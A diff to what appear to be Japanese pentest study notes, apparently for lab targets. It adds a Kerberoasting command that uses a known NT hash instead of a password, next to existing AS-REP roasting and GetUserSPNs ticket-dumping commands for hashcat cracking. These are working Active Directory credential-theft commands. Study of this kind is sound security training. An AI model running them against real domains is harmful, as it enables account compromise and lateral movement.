@@ -43,6 +43,12 @@ impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast 
 sudo impacket-GetNPUsers -usersfile ./usernames.txt -no-pass -dc-ip <targetIP> htb.local/ > asrep-roasting
 ```
 
+4.2 ドメインユーザのパスワードが分からないけどハッシュ値はわかるとき。
+```
+# with an NT hash
+GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+```
+
 5. Kerberoastingを実行するために、TGSを取得してhashcatで解析できる形でサービスチケットのハッシュを出力する。
 ```
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
